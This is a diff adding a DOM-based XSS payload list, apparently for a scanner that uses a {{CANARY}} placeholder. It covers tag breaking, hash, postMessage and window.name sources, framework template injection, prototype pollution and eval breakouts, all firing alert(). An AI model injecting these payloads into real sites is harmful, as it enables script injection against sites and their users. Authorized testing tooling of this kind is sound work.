@@ -1,0 +1,78 @@
+# DOM-based XSS Payloads
+# Target JS sinks via sources (hash, search, referrer, window.name, postMessage)
+
+# === Basic Injection ===
+<img src=x onerror=alert('{{CANARY}}')>
+<svg onload=alert('{{CANARY}}')>
+<script>alert('{{CANARY}}')</script>
+
+# === Tag Breaking ===
+"><img src=x onerror=alert('{{CANARY}}')>
+'><img src=x onerror=alert('{{CANARY}}')>
+"></select><img src=x onerror=alert('{{CANARY}}')>
+"></textarea><img src=x onerror=alert('{{CANARY}}')>
+"><script>alert('{{CANARY}}')</script>
+'><script>alert('{{CANARY}}')</script>
+</script><script>alert('{{CANARY}}')</script>
+
+# === innerHTML / document.write Targets ===
+<div onmouseover=alert('{{CANARY}}')>hover</div>
+<details open ontoggle=alert('{{CANARY}}')>
+<input onfocus=alert('{{CANARY}}') autofocus>
+
+# === location.hash Payloads ===
+#<img src=x onerror=alert('{{CANARY}}')>
+#"><script>alert('{{CANARY}}')</script>
+#javascript:alert('{{CANARY}}')
+
+# === location.search / URL Parameter Payloads ===
+<img src=x onerror=alert('{{CANARY}}')>
+"><img src=x onerror=alert('{{CANARY}}')>
+javascript:alert('{{CANARY}}')
+
+# === postMessage Payloads ===
+<img src=x onerror=alert('{{CANARY}}')>
+{"type":"xss","data":"<img src=x onerror=alert('{{CANARY}}')>"}
+{"__proto__":{"innerHTML":"<img src=x onerror=alert('{{CANARY}}')>"}}
+
+# === window.name Injection ===
+<img src=x onerror=alert('{{CANARY}}')>
+javascript:alert('{{CANARY}}')
+
+# === document.referrer Injection ===
+<img src=x onerror=alert('{{CANARY}}')>
+
+# === jQuery Sink Payloads ===
+<img src=x onerror=alert('{{CANARY}}')>
+<div id=x tabindex=1 onfocus=alert('{{CANARY}}')></div>
+#<img src=x onerror=alert('{{CANARY}}')>
+
+# === Angular Template Injection ===
+{{constructor.constructor('alert("{{CANARY}}")')()}}
+{{$on.constructor('alert("{{CANARY}}")')()}}
+
+# === Vue Template Injection ===
+{{_c.constructor('alert("{{CANARY}}")')()}}
+
+# === React dangerouslySetInnerHTML ===
+<img src=x onerror=alert('{{CANARY}}')>
+
+# === Prototype Pollution -> DOM XSS ===
+constructor[prototype][innerHTML]=<img src=x onerror=alert('{{CANARY}}')>
+__proto__[innerHTML]=<img src=x onerror=alert('{{CANARY}}')>
+
+# === Template Literal Injection ===
+${alert('{{CANARY}}')}
+`+alert('{{CANARY}}')+`
+
+# === eval() / Function() Targets ===
+';alert('{{CANARY}}');//
+";alert('{{CANARY}}');//
+\';alert('{{CANARY}}');//
+\";alert('{{CANARY}}');//
+1;alert('{{CANARY}}')
+1);alert('{{CANARY}}')//
+
+# === URL Redirection to XSS ===
+javascript:alert('{{CANARY}}')
+data:text/html,<script>alert('{{CANARY}}')</script>
